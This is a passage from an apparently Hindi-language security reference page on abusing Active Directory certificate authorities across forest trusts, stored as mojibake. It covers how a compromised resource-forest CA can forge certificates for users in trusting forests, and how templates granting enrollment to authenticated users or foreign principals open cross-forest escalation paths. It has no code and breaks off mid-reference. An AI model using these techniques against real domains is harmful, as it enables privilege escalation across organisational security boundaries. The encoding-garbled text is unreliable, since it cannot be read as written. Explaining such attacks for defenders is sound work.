### рд╕реАрдП рд╡рд┐рд╢реНрд╡рд╛рд╕ рд╡рдирд╕реНрдкрддрд┐ рдЯреНрд░рд╕реНрдЯ рддреЛрдбрд╝рдирд╛

**рдХреНрд░реЙрд╕-рд╡рдирд╕реНрдкрддрд┐ рдкрдВрдЬреАрдХрд░рдг** рдХреЗ рд▓рд┐рдП рд╕реЗрдЯрдЕрдк рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рд╕рд░рд▓ рд╣реИред рдкреНрд░рд╢рд╛рд╕рдХ рд╕рдВрд╕рд╛рдзрди рд╡рдирд╕реНрдкрддрд┐ рдХреЗ **рд░реВрдЯ рд╕реАрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдХреЛ **рдЦрд╛рддрд╛ рд╡рдирд╕реНрдкрддрд┐рдпреЛрдВ** рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрд╕рд╛рдзрди рд╡рдирд╕реНрдкрддрд┐ рдХреЗ **рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рд╕реАрдП** рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдЦрд╛рддрд╛ рд╡рдирд╕реНрдкрддрд┐ рдХреЗ **`NTAuthCertificates`** рдФрд░ AIA рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВред рд╕реНрдкрд╖реНрдЯ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП, рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **рд╕рдВрд╕рд╛рдзрди рд╡рдирд╕реНрдкрддрд┐ рдореЗрдВ рд╕реАрдП** рдХреЛ **рдЙрди рд╕рднреА рд╡рдирд╕реНрдкрддрд┐рдпреЛрдВ рдкрд░ рдкреНрд░рдмрдВрдзрди рдХрд╛ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг** рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рдирдХреЗ рд▓рд┐рдП рд╡рд╣ рдкреАрдХреЗрдЖрдИ рд╡реНрдпрд╡рд╕реНрдерд╛ рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд╛рд░ **рдЗрд╕ рд╕реАрдП рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреЗ рд╣реИрдВ**, рддреЛ рд╣рдо **рд╕рдВрд╕рд╛рдзрди рдФрд░ рдЦрд╛рддрд╛ рд╡рдирд╕реНрдкрддрд┐рдпреЛрдВ рдореЗрдВ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬрд╛рд▓реА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рд╡рдирд╕реНрдкрддрд┐ рд╕реБрд░рдХреНрд╖рд╛ рд╕реАрдорд╛ рдХреЛ рддреЛрдбрд╝рддреЗ рд╣реБрдПред

### рдкрдВрдЬреАрдХрд░рдг рдЕрдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рд╡рд┐рджреЗрд╢реА рдкреНрд░рдореБрдЦ

рдмрд╣реБ-рд╡рдирд╕реНрдкрддрд┐ рдкрд░реНрдпрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ рд╕рдВрдЧрдардиреЛрдВ рдХреЛ рд╕рддрд░реНрдХ рд░рд╣рдиреЗ рдХреА рдПрдХ рдФрд░ рдмрд╛рдд рд╣реИ рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рд╕реАрдП рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрд╛рд╢рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯреНрд╕ рд╣реИрдВ рдЬреЛ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдпрд╛ рд╡рд┐рджреЗрд╢реА рдкреНрд░рдореБрдЦреЛрдВ** (рд╡рдирд╕реНрдкрддрд┐ рд╕реЗ рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рд╕рдореВрд╣) рдХреЛ **рдкрдВрдЬреАрдХрд░рдг рдФрд░ рд╕рдВрдкрд╛рджрди рдЕрдзрд┐рдХрд╛рд░** рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред\
рдЬрдм рдПрдХ рдЦрд╛рддрд╛ **рд╡рд┐рд╢реНрд╡рд╛рд╕ рдкрд░ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрддрд╛ рд╣реИ**, рддреЛ AD рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЯреЛрдХрди рдореЗрдВ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ SID** рдХреЛ рдЬреЛрдбрд╝рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХрд┐рд╕реА рдбреЛрдореЗрди рдореЗрдВ рдПрдХ рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рд╕реАрдП рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╣реИ рдЬреЛ **рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкрдВрдЬреАрдХрд░рдг рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ**, рддреЛ рдПрдХ рдЕрд▓рдЧ рд╡рдирд╕реНрдкрддрд┐ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрдВрдЬреАрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЙрд╕реА рддрд░рд╣, рдпрджрд┐ рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **рд╡рд┐рджреЗрд╢реА рдкреНрд░рдореБрдЦ рдХреЛ рдкрдВрдЬреАрдХрд░рдг рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ**, рддреЛ рдПрдХ **рдХреНрд░реЙрд╕-рд╡рдирд╕реНрдкрддрд┐ рдкрд╣реБрдБрдЪ-рдирд┐рдпрдВрддреНрд░рдг рд╕рдВрдмрдВрдз рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдЬреЛ рдПрдХ рд╡рдирд╕реНрдкрддрд┐ рдореЗрдВ рдПрдХ рдкреНрд░рдореБрдЦ рдХреЛ рджреВрд╕рд░реА рд╡рдирд╕реНрдкрддрд┐ рдореЗрдВ рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдкрдВрдЬреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЕрдВрддрддрдГ, рджреЛрдиреЛрдВ рд╕реНрдерд┐рддрд┐рдпрд╛рдБ рдПрдХ рд╡рдирд╕реНрдкрддрд┐ рд╕реЗ рджреВрд╕рд░реА рд╡рдирд╕реНрдкрддрд┐ рдХреА рдУрд░ рд╕реЗ рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдмрдврд╝рд╛рддреА рд╣реИрдВред рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рдПрдХ рд╡рд┐рджреЗрд╢реА рдбреЛрдореЗрди рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

## рд╕рдВрджрд░реНрдн

* рдЗрд╕ рдкреГрд╖реНрда рдХреА рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА [https://www.spect
